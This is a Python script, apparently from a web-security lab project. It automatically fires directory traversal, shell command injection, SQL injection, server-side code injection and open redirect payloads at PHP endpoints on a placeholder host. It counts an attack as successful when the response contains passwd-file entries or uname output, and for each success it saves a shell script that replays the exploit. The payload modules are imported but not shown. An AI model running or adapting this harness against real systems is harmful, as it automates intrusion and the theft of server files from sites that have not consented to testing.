import requests
import ssci
import oRedirect 
import re
import sqli
import cmd
import dirtraversal
from datetime import datetime

BASE_URL = "http://target.com"
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Command Injection"


def injectPayload(url, paramname, method, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = ""	
	
	#if get
	if method == "GET":
		getURL = parsedURL + "?" + paramname+"="+payload[0]
		content = requests.get(getURL)
		html =  content.text

	#if post
	elif method == "POST":
		content = requests.post(parsedURL, data={paramname:payload[0]})
		html = content.text

	result = checkSuccess(html, payload[1], content, verbose)
	
	#if function returns:

	if result is not None:
		print payload
		f = open("exploit/" + payload[1] + str(datetime.now()) +".sh","w+")

		f.write("python showexploit.py " + '"' + parsedURL +'" ' + method + ' "' +payload[0]+'"')
		return payload

def checkSuccess(html, attackType, content, v=False):
	if v == True:
		print html

	if attackType == directory_traversal:
		match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
		if len(match) == 0:
			return None
		return match

	if attackType == shell_command:
		match = re.findall(r'GNU/Linux', html)
		if len(match) == 0:
			return None
		return match

	if attackType == sql_injection:
		match = re.findall(r'<p>.+', html)
		if len(match) ==0 :
			return None
		return match

	if attackType == open_redirect:
		if len(content.history) > 0 and content.url == "https://status.github.com/messages":
			return True

	#server side injection:
	if attackType == server_injection:
		#included index.php
		indexPHP = requests.get(BASE_URL + "index.php")
		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if "GNU/Linux" in html:
			return attackType

	return None;
	

if __name__ == "__main__":
	## test directory shell
    url = '/directorytraversal/directorytraversal.php'
    payloads = dirtraversal.get_all()

    for payload in payloads:
        ## capture param after url ?param=
        
        injectPayload(url, 'ascii', 'GET', payload)


	# ## test shell command
	# url = "/commandinjection/commandinjection.php"
	# payloads = cmd.get_all()
	# for payload in payloads:
	# 	injectPayload(url, "host", 'POST', payload)


	# #sqli
	# url = "/sqli/sqli.php"
	# payloads = sqli.get_all()
	# for payload in payloads:
	# 	injectPayload(url, "username", "POST", payload)



	#Test for server side code injection
	'''
	url = "/serverside/eval2.php"
	payloads = ssci.get_all(url)
	for payload in payloads:
		injectPayload(url, "page", "GET", payload)
	'''
	#test for open redirect
	# url = "/openredirect/openredirect.php"
	# orPayload = oRedirect.get_all()
	# for payload in orPayload:
	# 	injectPayload(url, "redirect", "GET", payload)
